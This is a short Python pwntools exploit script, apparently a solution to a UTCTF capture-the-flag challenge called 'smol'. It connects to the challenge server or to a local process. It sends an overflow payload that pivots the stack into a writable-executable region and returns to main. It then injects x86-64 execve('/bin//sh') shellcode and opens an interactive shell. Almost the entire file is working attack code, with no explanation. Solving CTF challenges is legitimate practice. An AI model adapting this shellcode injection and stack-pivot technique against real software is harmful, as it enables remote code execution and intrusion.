#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.utctf.live', 9998
binary = './smol'
brkpts = '''
'''

elf = ELF("smol")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)

leave = 0x40101e
rwx = 0x402000
main = 0x401011
pointer = 0x4000c0 + 0x8

if __name__ == "__main__":
    #gdb.attach(io)
    payload = "a"*0x8 + p64(rwx + 0x8) + p64(main)
    s(payload.ljust(0x200,"a"))
    shell = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    payload = "a"*0x10 + p64(0x402018) + shell
    sl(payload)
    io.interactive()
